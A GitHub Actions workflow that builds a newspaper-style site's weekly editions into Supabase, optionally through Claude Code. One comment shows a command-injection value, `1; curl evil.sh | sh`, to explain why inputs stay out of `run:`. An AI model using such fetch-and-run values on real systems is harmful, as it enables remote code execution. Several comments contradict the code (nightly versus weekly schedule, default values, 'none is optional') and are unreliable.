name: daily-edition

# The Daily Bread's content pipeline (SA-090 / F-136).
#
# Weekly (Wed, post-quota-reset) this builds the coming week's editions and writes the rows
# straight to Supabase. No commit and no deploy is involved in publishing
# content, which keeps the project's most failure-prone operation out of the
# daily path (Cloudflare Cron is inert here — wrangler.jsonc has triggers.crons
# commented out and the OpenNext worker exports only `fetch`).
#
# Deterministic sections (crossword, prayer, word, quiz, …) are written as
# `published` by the runner and are live the moment this job succeeds. Reviewed
# kinds land as drafts and wait in /admin/edition. If this job fails, the
# already-written week stays up and the red X is visible in the Actions tab
# for days before any reader could notice a gap.
#
# REQUIRED SECRETS — add under repo Settings → Secrets and variables → Actions:
#   - NEXT_PUBLIC_SUPABASE_URL   — where the rows are written
#   - SUPABASE_SERVICE_ROLE_KEY  — the only role allowed to write edition_items
#   - ANTHROPIC_API_KEY          — Sunday Lead fallback via the brain router.
#   - CLAUDE_CODE_OAUTH_TOKEN    — OPTIONAL (SA-095): from `claude setup-token`
#                                  (Pro/Max). When present, the Sunday Lead
#                                  composes through Claude Code on the
#                                  founder's SUBSCRIPTION and the runner skips
#                                  its API lead path — the pipeline's Anthropic
#                                  bill drops to $0.
# None has a default and none is optional. A missing Supabase secret arrives as
# an empty string and the runner aborts before it generates anything, naming the
# missing key. There is deliberately no `continue-on-error` anywhere in this
# workflow: a silently-skipped nightly build is indistinguishable from a working
# one until a reader opens an empty paper.
#
# Manual trigger: Actions tab → daily-edition → Run workflow. `days` builds a
# window (the founder's monthly-weekend fallback is days=30); `from` overrides
# the first date and defaults to tomorrow (UTC) when left blank.

on:
  schedule:
    # SA-095 (founder, 2026-08-19): the Claude subscription quota resets
    # Wednesdays at 5am Eastern. The WHOLE following week builds in one run
    # just after the reset, so the Sunday composition lands on a full tank.
    # 10:15 UTC = 6:15am EDT / 5:15am EST — always after 5am Eastern in
    # both halves of the year without tracking DST.
    - cron: '15 10 * * 3' # Wednesdays, just after the founder's quota reset
  workflow_dispatch:
    inputs:
      days:
        description: 'How many consecutive editions to build'
        required: false
        default: '1'
      from:
        description: 'First edition date, YYYY-MM-DD (UTC). Blank = tomorrow.'
        required: false
        default: ''

permissions:
  contents: read

# One edition build at a time. A manual dispatch that lands on top of the 03:00
# nightly would have both runs upserting the same (kind, publish_date, slot)
# rows concurrently. Queue instead of cancelling: the run already in flight is
# the one that must finish, and a cancelled build leaves a half-written edition.
concurrency:
  group: daily-edition
  cancel-in-progress: false

jobs:
  build-edition:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'

      - run: npm ci

      # Both dispatch inputs reach the shell as env vars and are read as shell
      # variables, never interpolated into `run:`. A `${{ }}` expansion is
      # pasted into the script before bash ever sees it, so a `days` value of
      # `1; curl evil.sh | sh` would run as a second command; `"$EDITION_DAYS"`
      # is just a (rejected) argument. On `schedule` the inputs context is
      # empty, so `|| 1` supplies the nightly default of tomorrow's edition.
      # SA-095: when the founder's subscription token is present, install
      # Claude Code and compose any Sunday lead through it (subscription-
      # billed); the runner then builds every kind EXCEPT lead. Without the
      # token, the original API path runs unchanged. Secrets cannot appear in
      # `if:` directly, so the token rides env and the shell branches.
      - name: Install Claude Code (subscription lead path)
        env:
          HAS_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN != '' }}
        run: |
          set -euo pipefail
          if [ "$HAS_TOKEN" = "true" ]; then
            npm install -g @anthropic-ai/claude-code
          else
            echo "no CLAUDE_CODE_OAUTH_TOKEN — API lead path will be used"
          fi

      - name: Build edition(s)
        env:
          NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          EDITION_FROM: ${{ inputs.from }}
          # Scheduled runs build the next 8 days (Thu → next Thu), which
          # always contains exactly one Sunday. Manual dispatches choose.
          EDITION_DAYS: ${{ inputs.days || 8 }}
        run: |
          set -euo pipefail
          FROM_FLAG=""
          if [ -n "${EDITION_FROM:-}" ]; then
            FROM_FLAG="--from=$EDITION_FROM"
          fi
          if [ -n "${CLAUDE_CODE_OAUTH_TOKEN:-}" ]; then
            # Subscription path: Claude Code composes Sundays; the runner
            # writes everything else. ANTHROPIC_API_KEY is deliberately
            # UNSET for both so nothing silently bills the API.
            unset ANTHROPIC_API_KEY
            node scripts/edition/compose-lead-claude.mjs --days="$EDITION_DAYS" $FROM_FLAG
            node scripts/edition/build.mjs --days="$EDITION_DAYS" $FROM_FLAG \
              --kinds=rail,season,word,practice,strip,crossword,unscramble,quiz,gallery,prayer
          else
            node scripts/edition/build.mjs --days="$EDITION_DAYS" $FROM_FLAG
          fi
